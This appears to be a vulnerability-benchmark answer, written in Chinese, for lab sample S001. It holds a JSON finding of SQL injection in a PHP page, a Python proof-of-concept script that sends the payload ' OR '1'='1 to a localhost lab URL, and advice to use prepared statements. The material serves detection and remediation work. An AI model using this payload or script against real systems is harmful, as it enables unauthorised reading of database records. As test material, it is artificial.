@@ -1,0 +1,82 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007：从 $_GET['name'] 读取外部输入并赋给 $name，未做类型或格式校验。",
+    "flow": "F01:0010：$name 被直接拼接到 WHERE name = '...' 的 SQL 字符串中。",
+    "guard": "无效：未使用预处理/绑定参数，未使用 mysqli_real_escape_string 等转义，也未使用白名单；单引号可改变 SQL 结构。",
+    "sink": "F01:0011：$db->query($sql) 执行拼接后的 SQL；F01:0012 读取结果并在 F01:0021-F01:0023 输出。"
+  },
+  "prerequisites": [
+    "本地入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问。",
+    "common/db_connect.php 提供已连接的 mysqli 变量 $db。",
+    "lab_people 表存在，且预置 1 Alice、2 Bob、3 Carol。",
+    "PHP 环境支持 mysqli 的 fetch_all 及 Throwable 捕获。"
+  ],
+  "missing_context": [],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行 python3 S001_poc.py。脚本先请求 name=Alice，再请求 name=' OR '1'='1（URL 编码后发送）；比较正文记录：普通请求预期只含 Alice，测试请求预期出现 Alice、Bob、Carol（记录数由 1 变为 3）。HTTP 200 仅作参考，不作为成功条件。失败时检查入口路径、common/db_connect.php、lab_people 预置数据、URL 编码及 PHP/MariaDB 错误日志。"
+}
+```
+
+本地验证 POC（Python3，仅访问 127.0.0.1:4280）：
+
+```python
+import urllib.parse
+import urllib.request
+import urllib.error
+
+BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+NORMAL_NAME = "Alice"
+TEST_NAME = "' OR '1'='1"
+
+
+def fetch(name):
+    url = BASE + "?" + urllib.parse.urlencode({"name": name})
+    req = urllib.request.Request(url, headers={"User-Agent": "S001-poc"})
+    with urllib.request.urlopen(req, timeout=5) as resp:
+        body = resp.read().decode("utf-8", "replace")
+        return resp.status, url, body
+
+
+def main():
+    try:
+        normal_status, normal_url, normal_body = fetch(NORMAL_NAME)
+        test_status, test_url, test_body = fetch(TEST_NAME)
+    except urllib.error.URLError as exc:
+        print("请求失败，请检查本地入口是否可访问：", exc)
+        return
+
+    print("普通 URL：", normal_url)
+    print("普通 HTTP 状态（仅参考，不作为成功条件）：", normal_status)
+    print("普通正文：")
+    print(normal_body)
+
+    print("测试 URL：", test_url)
+    print("测试 HTTP 状态（仅参考，不作为成功条件）：", test_status)
+    print("测试正文：")
+    print(test_body)
+
+    normal_ok = ("Alice" in normal_body) and ("Bob" not in normal_body) and ("Carol" not in normal_body)
+    test_ok = all(name in test_body for name in ("Alice", "Bob", "Carol"))
+
+    print("普通预期：正文仅含 Alice，不含 Bob/Carol；实际：", "符合" if normal_ok else "不符合")
+    print("测试预期：正文出现 Alice、Bob、Carol，记录数由 1 变 3；实际：", "符合" if test_ok else "不符合")
+
+    if not normal_ok:
+        print("失败检查：入口 URL、common/db_connect.php、lab_people 预置数据、name 参数编码。")
+    if not test_ok:
+        print("失败检查：测试输入是否原样进入查询、MariaDB 字符串处理、PHP 错误日志；不要以 HTTP 200 判定成功。")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+防护建议：对 `name` 使用预处理语句和参数绑定，例如 `prepare("SELECT id, name FROM lab_people WHERE name = ?")` 后绑定字符串参数；不要把外部输入拼接进 SQL。若未来允许动态列名、排序表达式或 IN 列表，应使用严格白名单或逐项绑定，而不是仅依赖转义。
+
+判断范围与待补信息：本判断基于当前页面 F01:0007-F01:0011 的输入到 SQL 执行路径；`common/db_connect.php` 内容未提供，但运行上下文声明其提供已连接的 `$db`。若实际连接文件、入口路径或表结构与上下文不同，需重新复核。
